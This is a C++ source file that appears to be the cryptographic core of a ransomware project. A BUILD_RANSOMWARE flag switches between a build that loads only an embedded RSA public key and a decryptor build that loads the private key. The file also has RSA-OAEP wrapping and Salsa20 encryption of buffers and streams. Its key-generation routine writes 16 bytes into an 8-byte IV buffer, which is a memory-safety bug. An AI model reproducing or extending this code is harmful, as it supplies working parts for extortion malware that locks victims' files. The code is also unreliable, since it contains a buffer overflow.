#include <iostream>
#include "config.h"
#include "cryptopp/base64.h"
#include "cryptopp/cryptlib.h"
#include "cryptopp/files.h"
#include "cryptopp/hex.h"
#include "cryptopp/osrng.h"
#include "cryptopp/rsa.h"
#include "cryptopp/salsa.h"
#include "keys.h"

CryptoPP::AutoSeededRandomPool prng;

std::string hexDecode(const std::string& input) {
  std::string decoded;
  CryptoPP::StringSource(
      input, true, new CryptoPP::HexDecoder(new CryptoPP::StringSink(decoded)));
  return decoded;
}

std::string hexEncode(const CryptoPP::byte* data, size_t dataSize) {
  std::string encodedData;
  CryptoPP::HexEncoder hexEncoder(new CryptoPP::StringSink(encodedData), true,
                                  0, "");
  hexEncoder.Put(data, dataSize);
  hexEncoder.MessageEnd();
  return encodedData;
}

std::string hexEncode(const std::string& data) {
  return hexEncode((const CryptoPP::byte*)(data.data()), data.size());
}

std::string hexEncode(const CryptoPP::SecByteBlock& data) {
  return hexEncode((const CryptoPP::byte*)(data.data()), data.size());
}
#if (!BUILD_RANSOMWARE)
CryptoPP::RSA::PrivateKey loadPrivateKey() {
  CryptoPP::ByteQueue queue;
  queue.Put2((CryptoPP::byte*)private_key, private_key_len, true, true);
  CryptoPP::RSA::PrivateKey rsaPrivate;
  rsaPrivate.Load(queue);
  bool valid = rsaPrivate.Validate(prng, 3);
  if (!valid)
    std::cerr << "RSA private key is not valid" << std::endl;
  else
    std::cout << "RSA private key loaded" << std::endl;

#if (VERBOSE)
  std::cout << "N:" << rsaPrivate.GetModulus() << std::endl;
  std::cout << "E:" << rsaPrivate.GetPublicExponent() << std::endl;
  std::cout << "D:" << rsaPrivate.GetPrivateExponent() << std::endl;
#endif
  return rsaPrivate;
}
#else
CryptoPP::RSA::PublicKey loadPublicKey() {
  CryptoPP::ByteQueue queue;
  queue.Put2((CryptoPP::byte*)public_key, public_key_len, true, true);
  CryptoPP::RSA::PublicKey rsaPublic;
  rsaPublic.Load(queue);
  bool valid = rsaPublic.Validate(prng, 3);

  if (!valid)
    std::cerr << "RSA public key is not valid" << std::endl;
  else
    std::cout << "RSA public key loaded" << std::endl;

#if (VERBOSE)
  std::cout << "N:" << rsaPublic.GetModulus() << std::endl;
  std::cout << "E:" << rsaPublic.GetPublicExponent() << std::endl;
#endif
  return rsaPublic;
}
#endif
void rsaEncrypt(CryptoPP::RSA::PublicKey& publicKey,
                std::string& plain,
                std::string& cipher) {
  CryptoPP::RSAES_OAEP_SHA_Encryptor e(publicKey);

  CryptoPP::StringSource(plain, true,
                         new CryptoPP::PK_EncryptorFilter(
                             prng, e, new CryptoPP::StringSink(cipher)));
}

void rsaDecrypt(CryptoPP::RSA::PrivateKey& privateKey,
                std::string& cipher,
                std::string& recovered) {
  CryptoPP::RSAES_OAEP_SHA_Decryptor d(privateKey);

  CryptoPP::StringSource(cipher, true,
                         new CryptoPP::PK_DecryptorFilter(
                             prng, d, new CryptoPP::StringSink(recovered)));
}

void genKeyIV(CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv) {
  CryptoPP::HexEncoder encoder(new CryptoPP::FileSink(std::cout));
  key.resize(16);
  iv.resize(8);
  prng.GenerateBlock(key, key.size());
  prng.GenerateBlock(iv, key.size());
#if (VERBOSE)
  std::cout << "Key: " << hexEncode(key) << std::endl;
  std::cout << "IV: " << hexEncode(iv) << std::endl;
#endif
}

void encrypt(CryptoPP::SecByteBlock& key,
             CryptoPP::SecByteBlock& iv,
             CryptoPP::byte* plain,
             CryptoPP::byte* cipher,
             size_t length) {
  CryptoPP::Salsa20::Encryption enc;

  enc.SetKeyWithIV(key, key.size(), iv, iv.size());
  enc.ProcessData(cipher, plain, length);
}

void encrypt(CryptoPP::SecByteBlock& key,
             CryptoPP::SecByteBlock& iv,
             std::string& plain,
             std::string& cipher) {
  cipher.resize(plain.size());
  encrypt(key, iv, (CryptoPP::byte*)plain.data(), (CryptoPP::byte*)&cipher[0],
          plain.size());
}

void encrypt(CryptoPP::SecByteBlock& key,
             CryptoPP::SecByteBlock& iv,
             std::istream& input,
             std::ostream& output) {
  CryptoPP::Salsa20::Encryption enc;
  enc.SetKeyWithIV(key, key.size(), iv, iv.size());

  CryptoPP::FileSource in(input, true, /*pumpAll*/
                          new CryptoPP::StreamTransformationFilter(
                              enc, new CryptoPP::FileSink(output)));
}

void decrypt(CryptoPP::SecByteBlock& key,
             CryptoPP::SecByteBlock& iv,
             CryptoPP::byte* cipher,
             CryptoPP::byte* recovered,
             size_t length) {
  CryptoPP::Salsa20::Decryption dec;
  dec.SetKeyWithIV(key, key.size(), iv, iv.size());
  dec.ProcessData(recovered, cipher, length);
}

void decrypt(CryptoPP::SecByteBlock& key,
             CryptoPP::SecByteBlock& iv,
             std::string& cipher,
             std::string& recovered) {
  recovered.resize(cipher.size());
  decrypt(key, iv, (CryptoPP::byte*)cipher.data(),
          (CryptoPP::byte*)&recovered[0], cipher.size());
}

void decrypt(CryptoPP::SecByteBlock& key,
             CryptoPP::SecByteBlock& iv,
             std::istream& input,
             std::ostream& output) {
  CryptoPP::Salsa20::Decryption dec;
  dec.SetKeyWithIV(key, key.size(), iv, iv.size());

  CryptoPP::FileSource in(input, true, /*pumpAll*/
                          new CryptoPP::StreamTransformationFilter(
                              dec, new CryptoPP::FileSink(output)));
}